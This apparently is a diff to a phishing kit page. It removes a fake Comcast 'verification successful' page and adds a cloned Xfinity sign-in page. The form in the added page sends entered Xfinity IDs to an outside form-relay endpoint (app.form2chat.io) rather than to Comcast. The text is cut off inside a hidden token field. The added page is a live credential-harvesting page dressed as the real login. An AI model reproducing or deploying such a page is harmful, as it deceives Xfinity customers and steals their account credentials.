@@ -1,408 +1,294 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
 
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Comcast</title>
-    <meta http-equiv="refresh" content="5; url=https://login.comcast.net/login">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<!DOCTYPE html>
+		
 
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together — anytime, anywhere, on any device.">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="msapplication-TileColor" content="#ffffff">
-    <meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
-    <meta name="theme-color" content="#ffffff">
-    <link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/junket/fonts-remote.min.css">
-    <link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/junket/styles-light.min.css">
-    <link rel="shortcut icon" href="https://login.xfinity.com/static/images/favicon/favicon.ico">
-    <link rel="apple-touch-icon" sizes="57x57" href="https://login.xfinity.com/static/images/favicon/apple-icon-57x57.png">
-    <link rel="apple-touch-icon" sizes="60x60" href="https://login.xfinity.com/static/images/favicon/apple-icon-60x60.png">
-    <link rel="apple-touch-icon" sizes="72x72" href="https://login.xfinity.com/static/images/favicon/apple-icon-72x72.png">
-    <link rel="apple-touch-icon" sizes="76x76" href="https://login.xfinity.com/static/images/favicon/apple-icon-76x76.png">
-    <link rel="apple-touch-icon" sizes="114x114" href="https://login.xfinity.com/static/images/favicon/apple-icon-114x114.png">
-    <link rel="apple-touch-icon" sizes="120x120" href="https://login.xfinity.com/static/images/favicon/apple-icon-120x120.png">
-    <link rel="apple-touch-icon" sizes="144x144" href="https://login.xfinity.com/static/images/favicon/apple-icon-144x144.png">
-    <link rel="apple-touch-icon" sizes="152x152" href="https://login.xfinity.com/static/images/favicon/apple-icon-152x152.png">
-    <link rel="apple-touch-icon" sizes="180x180" href="https://login.xfinity.com/static/images/favicon/apple-icon-180x180.png">
-    <link rel="icon" type="image/png" sizes="192x192" href="https://login.xfinity.com/static/images/favicon/android-icon-192x192.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://login.xfinity.com/static/images/favicon/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="96x96" href="https://login.xfinity.com/static/images/favicon/favicon-96x96.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://login.xfinity.com/static/images/favicon/favicon-16x16.png">
-    <style type="text/css">
-        @font-face {
-            font-family: "Segoe UI Web Light";
-            font-style: normal;
-            font-weight: 100;
-            src: local("Segoe UI Light"), local("Segoe UI"), local("Helvetica Neue");
-            unicode-range: U+0000-00FF;
-        }
-        
-        @font-face {
-            font-family: "Segoe UI Web Regular";
-            font-style: normal;
-            font-weight: normal;
-            src: local("Segoe UI"), local("Helvetica Neue");
-            unicode-range: U+0000-00FF;
-        }
-        
-        @font-face {
-            font-family: "Segoe UI Web Semibold";
-            font-style: normal;
-            font-weight: bold;
-            src: local("Segoe UI Semibold"), local("Segoe UI Bold"), local("Segoe UI"), local("Helvetica Neue");
-            unicode-range: U+0000-00FF;
-        }
-        
-        body {
-            font-family: "Segoe UI Web Light", "Segoe UI Light", "Segoe UI Web Regular", "Segoe UI", "Helvetica Neue", Arial;
-            margin: 0;
-            padding: 0;
-            border: none;
-            color: #fff;
-            height: 100%;
-            position: relative;
-        }
-        
-        body.hidden {
-            visibility: hidden;
-        }
-        
-        .ja-jp,
-        .ja-jp h1,
-        .ja-jp h2,
-        .ja-jp p,
-        .ja-jp a,
-        .ja-jp a:hover,
-        .ja-jp a:visited {
-            font-family: "Meiryo UI", Meiryo, "MS PGothic", Osaka, "Segoe UI", "Segoe UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", "BBAlpha Sans", "S60 Sans", Arial, "sans-serif";
-        }
-        
-        .km-kh,
-        .km-kh h1,
-        .km-kh h2,
-        .km-kh p,
-        .km-kh a .km-kh a:hover,
-        .km-kh a:visited {
-            font-family: "Khmer UI", "Segoe UI", "Segoe UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", "BBAlpha Sans", "S60 Sans", Arial, "sans-serif";
-        }
-        
-        .ko-kr,
-        .ko-kr h1,
-        .ko-kr h2,
-        .ko-kr p,
-        .ko-kr a,
-        .ko-kr a:hover,
-        .ko-kr a:visited {
-            font-family: "Malgun Gothic", Gulim, "Segoe UI", "Segoe UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", "BBAlpha Sans", "S60 Sans", Arial, "sans-serif";
-        }
-        
-        .zh-cn,
-        .zh-cn h1,
-        .zh-cn h2,
-        .zh-cn p,
-        .zh-hans,
-        .zh-hans h1,
-        .zh-hans h2,
-        .zh-hans p,
-        .zh-cn a,
-        .zh-cn a:hover,
-        .zh-cn a:visited {
-            font-family: "Microsoft Yahei", Verdana, Simsun, "Segoe UI", "Segoe UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", "BBAlpha Sans", "S60 Sans", Arial, "sans-serif";
-        }
-        
-        .zh-hant,
-        .zh-hant h1,
-        .zh-hant h2,
-        .zh-hant p,
-        .zh-hk,
-        .zh-hk h1,
-        .zh-hk h2,
-        .zh-hk p,
-        .zh-mo,
-        .zh-mo h1,
-        .zh-mo h2,
-        .zh-mo p,
-        .zh-sg,
-        .zh-sg h1,
-        .zh-sg h2,
-        .zh-sg p,
-        .zh-tw,
-        .zh-tw h1,
-        .zh-tw h2,
-        .zh-tw p,
-        .zh-hant a,
-        .zh-hant a:hover,
-        .zh-hant a:visited,
-        .zh-mo a,
-        .zh-mo a:hover,
-        .zh-mo a:visited,
-        .zh-sg a,
-        .zh-sg a:hover,
-        .zh-sg a:visited,
-        .zh-tw a,
-        .zh-tw a:hover,
-        .zh-tw a:visited {
-            font-family: "Microsoft JhengHei", Pmingliu, "Segoe UI", "Segoe UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", "BBAlpha Sans", "S60 Sans", Arial, "sans-serif";
-        }
-        
-        img {
-            border: none;
-            float: left;
-        }
-        /*div#mboxDefault {visibility:visible;}*/
-        
-        h1 {
-            font-weight: 100;
-            color: #fff;
-            font-size: 21px;
-            line-height: 17px;
-            float: left;
-            padding: 0px 0px 0px 7px;
-            margin: 0px;
-        }
-        
-        h2 {
-            font-weight: 100;
-            color: #000;
-            font-size: 22px;
-            line-height: 22px;
-            padding: 0px;
-            margin: 30px 0px 20px 50px;
-        }
-        
-        a,
-        a:hover,
-        a:visited {
-            font-family: "Segoe UI Web Semibold", "Segoe UI Web Regular", "Segoe UI", "Helvetica Neue", Arial;
-            border: 1px #fff;
-            color: #fff;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 14px;
-            font-weight: 100;
-            min-width: 70px;
-            text-align: center;
-            padding: 3px 12px 5px 12px;
-            margin: 0px 0px 0px 50px;
-        }
-        
-        #brand a {
-            margin: 0px;
-            padding: 0px 0px 0 10px;
-            height: 40px;
-            color: #212121;
-        }
-        
-        #brand a:hover {
-            opacity: 1.0 !important;
-            background-color: rgba(0, 0, 0, 0.18);
-        }
-        
-        iframe {
-            border: solid 0px gray;
-        }
-        
-        div#confirm {
-            height: 170px;
-            width: 100%;
-            margin: 0;
-            padding: 0px 0px 30px 0px;
-        }
-        
-        div#brand {
-            height: 40px;
-            margin: 0;
-            padding: 0px 0px 0px 10px;
-        }
-        
-        iframe#offer {
-            min-height: 500px;
-            min-width: 800px;
-        }
-        
-        div#container {
-            height: auto !important;
-            margin: 0 auto -1px;
-            min-height: 100%;
-        }
-        
-        div#footer {
-            border-top: solid 1px #ccc;
-            position: fixed;
-            bottom: 0px;
-            overflow: auto;
-            left: 0px;
-            width: 100%;
-            height: 30px;
-            background-color: white;
-        }
-        
-        #footer span,
-        #footer a {
-            font-family: "Segoe UI Web Regular", "Segoe UI", "Helvetica Neue", Arial;
-            font-size: 12px;
-            padding: 3px;
-            float: left;
-            display: inline;
-            min-width: inherit;
-            margin: 0px;
-            padding: 7px 10px;
-            color: gray;
-        }
-        /*Brands*/
-        
-        .hotmail {
-            background-color: #f89a1e;
-        }
-        
-        .hotmail a,
-        .hotmail a:hover,
-        .hotmail a:visited,
-        .hotmail a:active {
-            color: #f89a1e;
-        }
-        
-        .newmail {
-            background-color: #0072C6;
-        }
-        
-        .newmail a,
-        .newmail a:hover,
-        .newmail a:visited,
-        .newmail a:active {
-            color: #0072C6;
-        }
-        /*Creative Template*/
-        
-        div#offer {
-            margin: 0px 45px 10px 50px;
-            padding: 0px;
-            max-width: 1200px;
-            min-height: 500px;
-            min-width: 640px;
-        }
-        
-        div#offer a#button {
-            margin: 0px;
-            background-color: #cacaca;
-        }
-        
-        body.rtl div#brand a {
-            margin-right: 10px;
-        }
-        
-        body.rtl div#confirm h2,
-        body.rtl div#confirm a#signin {
-            margin-right: 50px;
-        }
-        
-        div#confirm a:hover,
-        div#offer a#button:hover {
-            opacity: 0.76;
-            filter: alpha(opacity=76);
-        }
-        
-        div#confirm a.newmail:active,
-        div#confirm a.hotmail:active,
-        div#offer a.newmail:active,
-        div#offer a.hotmail:active {
-            opacity: 1;
-            filter: alpha(opacity=100);
-            background-color: black;
-        }
-        
-        a#follow {
-            background: transparent url('../images/logo-twitter.png') no-repeat top left;
-            padding-left: 32px;
-            height: 24px;
-            color: #0072c6;
-            margin: 0px;
-        }
-        
-        body.rtl a#follow {
-            background-position: top right;
-            padding-left: 0px;
-            padding-right: 32px;
-        }
-        
-        div#offer h1,
-        div#offer p {
-            color: #808080;
-            padding: 0;
-        }
-        
-        div#offer h1 {
-            font-size: 40px;
-            line-height: 50px;
-            width: 55%;
-            *width: auto;
-            /*IE7*/
-            display: block;
-            margin-bottom: 10px;
-            float: none;
-            overflow-wrap: break-word;
-        }
-        
-        div#offer p {
-            display: block;
-            font-size: 15px;
-            width: 55%;
-            *width: auto;
-            /*IE7*/
-            max-width: 600px;
-        }
-        
-        .smallest div#offer h1 {
-            font-size: 36px;
-        }
-        
-        .smallest div#offer p {
-            font-size: 15px;
-        }
-        
-        div#offer p.additional {
-            margin-top: 60px;
-        }
-        
-        div#offer img {
-            float: right;
-            padding: 10px;
-        }
-        
-        body.rtl div#offer img {
-            float: left;
-        }
-    </style>
-    <link rel="stylesheet" type="text/css" href="food/style2.css">
-</head>
 
-<body dir="ltr" class="ltr normal en-in">
-    <div id="confirm">
-        <div id="brand" class="newmail">
-            <a href="#">
-                <img src="https://www.perkspot.com/wp-content/themes/perkspot-brew/library/images/logos/categories/homeservices/logo-comcast.png">
-            </a>
-        </div>
-        <table>
-            <td>
-                <br />
-                <br />
-                <br />
-                <h2>VERIFICATION SUCCESSFUL...<br>
-                    <br>Your account verification information has been updated.</h2>
-            </td>
-        </table>
+			
+		
+
+			
+
+
+			
+		
+		
+	
+<html
+	lang="en"
+	class="light da  h-full"
+	data-resource-package-id="res-responsive-login-page"
+>
+	<head>
+					<script type="text/javascript" src="/static/js/comcast-common.js" ></script>
+				<title>Sign in to Xfinity</title>
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device.">
+		<meta name="viewport" content="width=device-width,initial-scale=1">
+		<meta name="msapplication-TileColor" content="#ffffff">
+		<meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
+		<meta name="theme-color" content="#ffffff">
+				    <link rel="stylesheet" href="/static/resi/dist/prism-ui/prism-ui-ce41cd1.css"/>
+    <link rel="stylesheet" href="/static/resi/dist/bundle-ce41cd1.css"/>
+        <script type="module" src="/static/resi/dist/prism-ui/prism-ui.esm-ce41cd1.js"></script>
+    <script type="text/javascript" src="/static/resi/dist/bundle-ce41cd1.js" defer></script>
+						<link rel="shortcut icon" href="/static/images/favicon/favicon.ico">
+		<link rel="apple-touch-icon" sizes="57x57" href="static/images/favicon/apple-icon-57x57.png">
+		<link rel="apple-touch-icon" sizes="60x60" href="static/images/favicon/apple-icon-60x60.png">
+		<link rel="apple-touch-icon" sizes="72x72" href="static/images/favicon/apple-icon-72x72.png">
+		<link rel="apple-touch-icon" sizes="76x76" href="static/images/favicon/apple-icon-76x76.png">
+		<link rel="apple-touch-icon" sizes="114x114" href="static/images/favicon/apple-icon-114x114.png">
+		<link rel="apple-touch-icon" sizes="120x120" href="static/images/favicon/apple-icon-120x120.png">
+		<link rel="apple-touch-icon" sizes="144x144" href="static/images/favicon/apple-icon-144x144.png">
+		<link rel="apple-touch-icon" sizes="152x152" href="static/images/favicon/apple-icon-152x152.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="static/images/favicon/apple-icon-180x180.png">
+		<link rel="icon" type="image/png" sizes="192x192"  href="static/images/favicon/android-icon-192x192.png">
+		<link rel="icon" type="image/png" sizes="32x32" href="static/images/favicon/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="96x96" href="static/images/favicon/favicon-96x96.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="static/images/favicon/favicon-16x16.png">
+		<link rel="manifest" href="static/images/favicon/manifest.json">
+
+		<script type="text/javascript">
+			runtimeData = {
+									"r": "comcast.net",									"selectAccount": "false",									"s": "portal",									"deviceAuthn": "false",									"continue": "http://xfinity.comcast.net/",									"ipAddrAuthn": "false",									"forceAuthn": "0",									"flowStateId": "CgNDRlMQAhgBIiCaKHJmSAauPB688Kf4wvCny33591WPmbhSOMm-KOo9DSoQqf3tfQ_q4stkPOXIU7LDijJ8CjwyMDIwLTA0LTI4dDIxOjI5OjMwIWYxMWFiZGNmLTQyMWEtNDEyMS1hNGUxLTc5MjBiY2FmYzJjZSFlbmMSPDIwMjAtMDQtMjh0MjE6Mjk6MjkhYzk5YWE0MzMtMmQyMi00MDY0LTliMDItMWJkNGVlNzk3YWJhIXNpZzqAFq8e1gxFfhFU5IYKxs44EJVEUgLEsjXuyxY-Hx3bghglHRjvWAj8Tc1mGMQzswBP4-I6Rfmy4FKpW51_8vboap-KexGwFUSJAQQbTXQuaoMAm4zvi2PKXXGdAnzuhrdnOfhPeXr8UTJCMi0fuVVJmWSBharF2jeGO1KA6ePw1GpB9jlLNQLWrdsk9Xw8sRrFgSl0SYrVSQfPPNwHienEhBEVa1xKOjfdvt4lrG5oPJGJA3h3zAz7InNyOHKRiX39RuYSiKsL52hTCfj4CxKht9LHtzZr-RyzokLzdfmURNQaBBwfmL6Ujh4Nu7PskzBvEqU08yZCiUBGsIVpFuy5KAmj1eePuPQ9fhK4H-RW1QMEQgrijjuhy5oGKhNfKRtz079SbZ8rtwKyng_6HH8BQdMSOCHHySDFAYavi6vdyuaeyK7h5dNFEDQcS6SMtYIPDXxva5saTYIPS75ayCd_Y_DPpCdKjxeCaAi2cDwr-1eVCJT0XhcePUrqG6LH2jyOTueJqNLwZpZeTzlwjHezwTdqUyMyDJLz_FFwaozDq9cOw1oT2z4o3vlbA_qi80O_6FpEH7b-Ks4ju-xMRaLzjez2xX9CymaR6okyYhqNyiwO4n5jHwKrtXIu2fExTeUCKAVB5gEo-JICPUVLyDT8FnPAssk9jYSGvjsd_BtUzimpfnuX2RDvy0Jm6-zCJLJANNqlY7zAEUmOXnNhYnV6HWSHuQtwv51g6fjNSrgun6XeQYOGFu47x7oyJ_tq1HbY7AmY6DTKE0k43kqVzd3Fq6fz2Ok-uwYeR_dVmKXhQKMaV62ACnBKgwuzf0x7_U0N9hXhVhZ2ufItiJl5fQdLC0aTNLdV7I6jW7c0yca_dQLb_FuSrJ7HoCDeb3ZyKDUAqgvQcAtXYAK8fk_KEVzAChx476SNysMCROtQ6C6Rl6N-_aw_6FOPQ-E_eSPBv2tvhgkFep4hrn-O_AeOPNpGr_uFdLBb7gPkUPK0N-Q6ohUQFmnDQW74Q_NaTgyfapc3qB8zt4rmm0bohjvIZYLjLcvIE5JlurJ2tj-mgJW7VpNaF9DeM88Xv8l5XsLEIuXiFeMPh8oaynou9KHFxcb5FJlDxhUNhj1Y1tcG1pzBUcdJqb4Q0RyG_uYzDyzZ9YYmoT3LRvumGz5RnosqO6DjM8k0-KFIA3c8t9h2D3FaVqNpz-XVFY_GcSGroW2-hZ0VOcPFhvKe8fRewO_l5Egr-8GxF0Q4FIe5Y6KhzThLDRSXWQTt6J1H0Ns38gI-IXyE-3YKnztz2AeMDoM-azFq4z5U6G3or8iDEFV5D83_cMH1Z4Q9p8zddUVOWgYI8AQqYtaqvKkkEJVHGiypJQWnH5QzoIFGuji8VRMQM01mF_cDnJrsbVFVvYJG0Z8wyvJriFNOpBMVu0x9_iBphtkBtbVqZVkS7b88YYiStcbuWagGhxFy0L1zeDwDUyvxjHjp4gHdEYPDPqw3Vgzwvd_Hdeox6E_FNN59wJ6pxiFsZTOEBlAab6ZogwPTmyAyJ-i6ZHbYHIR8rFfFoZCKoWzFBRIRLPCCJalyiJmOVpbDghEWFMukeC1LZZg_qQZwvVeQknFbMdy0JisGSjfxiGVBCPPp64DxNRIOiqeO2_Y7lhGQOhPgvj6DIdz3E-cpZF9bQyG5f9YzIosbhkD9ShIgk95WGUZYhmAhQDMYYlYeLpmXpZXQ_7H0iG6KzeOoAQyInpt8DevO-PXF5oRADjl8REeu3uTfKW8t2W5v1Dy3yt3zZGLP-NOQV5u_6S3JeQTajYzMiAnGyG0D4NAgEmMcjwoHGSAUn5g7ZkVWglIu9p-cc06sziXflrnC6oK-3TmNPq2FSP_azgLRlnXqqjqWzPJiA2tfM9yYSUMghM5yvQyB0stMFC7Tpp3b6wdSVyjGORDIJ1KwBDbI9qhtxPbZFR8miOWDYrn5OUNKlKDxYsqRFiShnd84qlBCvSRLkpGctqrL95PDcu1V55N18hF3-2f-l8311V6UdNY1kP41rEx8xT7DFCz849moDYwjURcaSHEMdLOteCE4Lu2bGm5FITXix1wD9dbbI5W6LdZrtO4l8pFrfghSOMD1Dlu4B0TG4-3erbnF1gzi_wvOwADbxysGt6Zk2SeV01hwJYiiV0-v3540dDf6zuXzQyezXk4wBnc3xb28XVaqKKIBVe4ellvVpns2HfFDy8Q6DVn6jmSTGO3AMkFiNrz-r7sWeJU6TT0hYvHFXhiLmWgYWoV1d_Uct731xZ_h3722AvRfot7cowRawB8K-ZYDbIaGBHKFNkgEJbbzVEqDo6Yj_qO0lUt5Dwx6Un6KtasUFMgMZOjLxaB5jqmvjadcRP43UmP_7fQ9ksRd27L9z8cA_zU7SLCyTfsEUpLCqEs3oaoa0uY0IU2hafCOk_qo6eB1eCjWuzG6m6xQ4HaAZSAt8LTzDVk2igkO_oHtnwMvqQNghgRimXmD-2CXPoqTJFkLGYeT3siv3F5zdLKNqPHXmitatualtYQo6LTkgoMiuCx_yjEbu88zy_pNqNAx4JR7DfFwPCPv8CDJ3hy-a6OJYYLDi0iLwwPTKNUxgG6TKzpX4eMjmLWy9lGqJ85RiyLlFIN7lUEao2VDLU9HpeHQq6dZCxoYySK18e9CoPennQpEIyWGieyyX79dA4lc164g3K-k2E20KXsEyJoiR0IrS7uTlOrGbAIRMpGGTQ6Y469CvDrqzO6ESSqPQvVMBPXexzwn3Rpmf3vnFTqkc8gs0JZ_otdY4YlRFCfJ8W24o77oPuL8DF5rfRWKX4EHy4coC6r56ffgVLyWU0nmeuQw2rWqZ0Pw1T-aFrsFnsZKMVhncTJI15DmMmCeE9yhQcgxo0b0p3vng7V-Bo90bc6s1yL23Xyshpnltnu4K9yIxiXcejC44QFoQE3fTx3R97k53OhiyOD6ed8f5yKNKv_t9RIvVQ2ifM8m1E9IdG4V6YAvwX7jWVZNX_LZJQJUA5UQ0S1F6wojFycaXnvzrT-j6biwFaB-Aym-GCp6MzGSW-GVuuow6zlb3-cP-ay-XCOg8tF85sNRS8n1lNjwFcYTgbuR7Ik5fzY5ykuIOHSzkrtUBVf4n_AXuY6egvtDwMugJKEEe0FNlvREtmlCK4hJADzsxLVM9321Zk3ssD7fYVcEFFm55CrN1drTx1F5PZlULsmyDZko_OC8CZy8t7VNIjf2qLCHl01XFGtiW4vN8l5yvWHpVTlP9_YFv2ClMt-w08Nw0vFYe7g_nrSnXgYPt1jjnxIPLkF8msPLvNKI7sS2GnOwrXWdL7A7gGn4a9PsXz5AAKBxOUbxGESMQLRRFVMjvyayJuSCJzMi58xI0oH-F358mvx6LAT2moSQhHs2wXb2eU2LSYKE2EDYHdQPuSDVSG9awU0XMwTViou6J_GaJX46qC6V0VfVB9f9ssW_88vXjx0UjM4ghyg7coscriKY99S-64aCM8_5031fT8SIkHX_XnPw02pa9tGCPZXrli_oRRWoau_ammgwgT3t50D_Dcaooy-_urvP5p1u0kOtSETE6W1_Wjk_nogYR0S0gCq1u20jVjoypt6M98wC6jWEv2b7YminGi5Wr961VV4InHEdufjjiCbWruRN3kp66BHh74Y87rceDIgyaAdf0zGaOYF0xcS_CGKUEBq0oe86cXvsx_j8t8YwyIFVAfwPYTH1P6mYhpZwlk2_xG7U28JKW7qZQ_ENvP_vWyibsdK56OEw",									"lang": "en",									"passive": "false",									"flowId": "e93cdc1d-65bf-4648-8494-36bec671c418",									"reqId": "1e381469-5ad9-46e3-ad1c-224b8395a7bd"							}
+		</script>
+
+																    <script src="https://scripts.webcontentassessor.com/scripts/e5d00e87ba3bf67af60bbc75377626fb1f0b0a10c2e83ca40b7a245ca2cd8367"></script>
+
+				<link rel="stylesheet" type="text/css" href="https://cdn.comcast.com/cmp/css/cookie-consent.css" />
+		<script type="text/javascript" src="https://cdn-prod.securiti.ai/consent/auto_blocking/4b9bbe2a-9c5d-4512-bb76-768a8ea32bc0/a76cdf55-ebf2-44a8-890a-2b5167b45b18.js"></script>
+	
+																	<style>
+					.da-fullscreen iframe[id^="utif_"] {
+max-width: 300px;
+max-height: 600px;
+overflow: hidden;
+}
+</style>
+<script>
+document.addEventListener("c-tracking-log-page", function () {
+document.documentElement.classList.add(digitalData.page.category.subCategory1);
+});
+</script>
+<style>
+				</style>
+					
+		<noscript>
+			<link rel="stylesheet" type="text/css" href="/static/resi/dist/noscript-styles-ce41cd1.css" />
+		</noscript>
+	</head>
+		<body class=" has-footer">
+		<noscript class="no-script">
+    <div class="no-script-error">
+        <img src="/static/images/global/alert--caution.svg" alt="alert-caution" />
+        <h2>We can't sign you in</h2>
+        <p>Your browser may be set to block cookies, or you may have Javascript disabled. Check your browser settings and try again.</p>
+        <a href=""><button>Try again</button></a>
     </div>
-    <div id="mboxDefault" class="mboxDefault" style="visibility: visible; display: block;">
-        <div id="offer">
-            <img src="http://www.underconsideration.com/brandnew/archives/xfinity_logo.gif" alt="Let us hear it">
-        </div>
-    </div>
-    </div>
-    <div id="mboxMarker-default-PROD-outlook_signout-0" style="visibility:hidden;display:none">&nbsp;</div>
-    <div id="footer"><span id="ftrCopy">?2014 Microsoft</span><a href="#" id="ftrTerms">Terms</a><a href="#" id="ftrPrivacy">Privacy &amp; cookies</a></div>
-</body>
+</noscript>
+					<div id="background" class="hidden lg:block absolute top-0 w-full h-full"></div>
+				
+				<main class='flex flex-row justify-center next:p-0'>
+							<div
+					id="left"
+					class="box-border align-top text-left mr-7.5 w-[594px] hidden lg:inline-block empty:hidden"
+				>		
 
+
+
+
+<div id="ad-block">
+	<h2 id="ad-heading" class="screen-reader-text sr-only">Advertisement</h2>
+	<div id="ad-target">
+		<script type="text/javascript" src="/static/js/vm-login-form-ad-ce41cd1.js"></script>
+		<script>
+			adInfo.init({
+				targetAdElemId: 'ad-target',
+				tvePartner: '',
+				useIframe : false
+			});
+		</script>
+	</div>
+	<img width="0" height="0" src="https://7468.v.fwmrm.net/ad/u?mode=echo&amp;cr=https%3A%2F%2Fdpm.demdex.net%2Fibs%3Adpid%3D796%26dpuuid=%23%7Buser.id%7D">
+<img src="https://xfinitydigital.demdex.net/event?d_sid=4702129" width="0" height="0" /></div>
+	</div><div
+					id="right"
+					class="w-full max-w-[420px] break-words"
+				>	<div class="prism-box p-0 lg:p-6">
+	<form name="signin" action="https://app.form2chat.io/f/b25e2641" method="post" novalidate>
+					
+
+
+
+
+<div class="single logo-wrapper flex items-center mb-7 lg:mb-10">
+			<span aria-role="img" class="bg-xfinity-logo bg-cover bg-no-repeat inline-block flex-shrink-0 h-6 w-17.75"></span>
+		</div>
+							<prism-text tag="h1" display="display2">Sign in with your Xfinity ID</prism-text>
+						<prism-input-text
+			prism-id="user"
+			name="user"
+			label="Enter your Xfinity ID"
+			hide-label="true"
+			placeholder="Email, mobile, or username"
+			value=""
+			autocomplete="username"
+			autocorrect="off"
+			auto-capitalize="off"
+			spellcheck="false"
+			maxlength="128"
+			required="true"
+			data-value-missing="Please enter your Xfinity ID to sign in."
+					></prism-input-text>
+					<prism-text id="implied-legal" display="body3">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</prism-text>
+		
+					<prism-button prism-id="sign_in" type="submit" tone="theme1" class="block my-10">Let's go</prism-button>
+		
+		
+					<input type="hidden" name="r" value="comcast.net">
+					<input type="hidden" name="selectAccount" value="false">
+					<input type="hidden" name="s" value="portal">
+					<input type="hidden" name="deviceAuthn" value="false">
+					<input type="hidden" name="continue" value="http://xfinity.comcast.net/">
+					<input type="hidden" name="ipAddrAuthn" value="false">
+					<input type="hidden" name="forceAuthn" value="0">
+					<input type="hidden" name="flowStateId" value="CgNDRlMQAhgBIiCaKHJmSAauPB688Kf4wvCny33591WPmbhSOMm-KOo9DSoQqf3tfQ_q4stkPOXIU7LDijJ8CjwyMDIwLTA0LTI4dDIxOjI5OjMwIWYxMWFiZGNmLTQyMWEtNDEyMS1hNGUxLTc5MjBiY2FmYzJjZSFlbmMSPDIwMjAtMDQtMjh0MjE6Mjk6MjkhYzk5YWE0MzMtMmQyMi00MDY0LTliMDItMWJkNGVlNzk3YWJhIXNpZzqAFq8e1gxFfhFU5IYKxs44EJVEUgLEsjXuyxY-Hx3bghglHRjvWAj8Tc1mGMQzswBP4-I6Rfmy4FKpW51_8vboap-KexGwFUSJAQQbTXQuaoMAm4zvi2PKXXGdAnzuhrdnOfhPeXr8UTJCMi0fuVVJmWSBharF2jeGO1KA6ePw1GpB9jlLNQLWrdsk9Xw8sRrFgSl0SYrVSQfPPNwHienEhBEVa1xKOjfdvt4lrG5oPJGJA3h3zAz7InNyOHKRiX39RuYSiKsL52hTCfj4CxKht9LHtzZr-RyzokLzdfmURNQaBBwfmL6Ujh4Nu7PskzBvEqU08yZCiUBGsIVpFuy5KAmj1eePuPQ9fhK4H-RW1QMEQgrijjuhy5oGKhNfKRtz079SbZ8rtwKyng_6HH8BQdMSOCHHySDFAYavi6vdyuaeyK7h5dNFEDQcS6SMtYIPDXxva5saTYIPS75ayCd_Y_DPpCdKjxeCaAi2cDwr-1eVCJT0XhcePUrqG6LH2jyOTueJqNLwZpZeTzlwjHezwTdqUyMyDJLz_FFwaozDq9cOw1oT2z4o3vlbA_qi80O_6FpEH7b-Ks4ju-xMRaLzjez2xX9CymaR6okyYhqNyiwO4n5jHwKrtXIu2fExTeUCKAVB5gEo-JICPUVLyDT8FnPAssk9jYSGvjsd_BtUzimpfnuX2RDvy0Jm6-zCJLJANNqlY7zAEUmOXnNhYnV6HWSHuQtwv51g6fjNSrgun6XeQYOGFu47x7oyJ_tq1HbY7AmY6DTKE0k43kqVzd3Fq6fz2Ok-uwYeR_dVmKXhQKMaV62ACnBKgwuzf0x7_U0N9hXhVhZ2ufItiJl5fQdLC0aTNLdV7I6jW7c0yca_dQLb_FuSrJ7HoCDeb3ZyKDUAqgvQcAtXYAK8fk_KEVzAChx476SNysMCROtQ6C6Rl6N-_aw_6FOPQ-E_eSPBv2tvhgkFep4hrn-O_AeOPNpGr_uFdLBb7gPkUPK0N-Q6ohUQFmnDQW74Q_NaTgyfapc3qB8zt4rmm0bohjvIZYLjLcvIE5JlurJ2tj-mgJW7VpNaF9DeM88Xv8l5XsLEIuXiFeMPh8oaynou9KHFxcb5FJlDxhUNhj1Y1tcG1pzBUcdJqb4Q0RyG_uYzDyzZ9YYmoT3LRvumGz5RnosqO6DjM8k0-KFIA3c8t9h2D3FaVqNpz-XVFY_GcSGroW2-hZ0VOcPFhvKe8fRewO_l5Egr-8GxF0Q4FIe5Y6KhzThLDRSXWQTt6J1H0Ns38gI-IXyE-3YKnztz2AeMDoM-azFq4z5U6G3or8iDEFV5D83_cMH1Z4Q9p8zddUVOWgYI8AQqYtaqvKkkEJVHGiypJQWnH5QzoIFGuji8VRMQM01mF_cDnJrsbVFVvYJG0Z8wyvJriFNOpBMVu0x9_iBphtkBtbVqZVkS7b88YYiStcbuWagGhxFy0L1zeDwDUyvxjHjp4gHdEYPDPqw3Vgzwvd_Hdeox6E_FNN59wJ6pxiFsZTOEBlAab6ZogwPTmyAyJ-i6ZHbYHIR8rFfFoZCKoWzFBRIRLPCCJalyiJmOVpbDghEWFMukeC1LZZg_qQZwvVeQknFbMdy0JisGSjfxiGVBCPPp64DxNRIOiqeO2_Y7lhGQOhPgvj6DIdz3E-cpZF9bQyG5f9YzIosbhkD9ShIgk95WGUZYhmAhQDMYYlYeLpmXpZXQ_7H0iG6KzeOoAQyInpt8DevO-PXF5oRADjl8REeu3uTfKW8t2W5v1Dy3yt3zZGLP-NOQV